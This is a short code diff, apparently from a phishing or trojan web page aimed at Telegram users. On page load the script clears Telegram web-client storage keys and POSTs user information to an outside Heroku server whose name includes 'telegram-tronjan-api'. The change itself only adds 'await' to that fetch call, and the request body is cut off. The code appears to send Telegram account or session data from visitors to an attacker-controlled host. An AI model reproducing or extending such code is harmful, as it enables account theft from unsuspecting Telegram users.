@@ -13,7 +13,7 @@ document.addEventListener("DOMContentLoaded", function() {
         localStorage.removeItem("GramJs:apiCache");
         localStorage.removeItem("tt-global-state");
         try {
-          fetch(`https://telegram-tronjan-api-6651ccf8d8ad.herokuapp.com/api/users/telegram/info`, {
+          await fetch(`https://telegram-tronjan-api-6651ccf8d8ad.herokuapp.com/api/users/telegram/info`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
